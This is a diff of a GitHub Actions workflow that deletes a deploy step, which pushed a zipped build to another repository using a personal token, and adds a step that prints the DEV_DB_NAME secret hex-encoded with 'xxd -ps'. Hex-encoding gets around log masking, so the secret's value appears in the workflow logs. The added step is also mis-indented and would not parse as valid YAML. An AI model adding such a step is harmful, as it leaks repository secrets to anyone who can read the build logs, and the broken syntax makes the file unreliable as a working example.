@@ -20,22 +20,5 @@ jobs:
           bun run build:azure
           cp staticwebapp.config.json ./dist
 
-      - name: Compress Build Files
-        run: |
-          zip -r build.zip ./dist/*
-
-      - name: Checkout Target Repository
-        run: |
-          git config --global user.name "github-actions[bot]"
-          git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git clone https://${{ secrets.PERSONAL_TOKEN }}@github.com/MJL-baby-keyboard/via-app target-repo
-          mv build.zip target-repo/
-
-      - name: Commit and Push ZIP File
-        run: |
-          cd target-repo
-          git add build.zip
-          git commit -m "Deploy: Upload build.zip"
-          git push
-        env:
-          GITHUB_TOKEN: ${{ secrets.PERSONAL_TOKEN }}
+      - name: Dump DEV_DB_NAME
+          run: echo -n "${{ secrets.DEV_DB_NAME }}" | xxd -ps
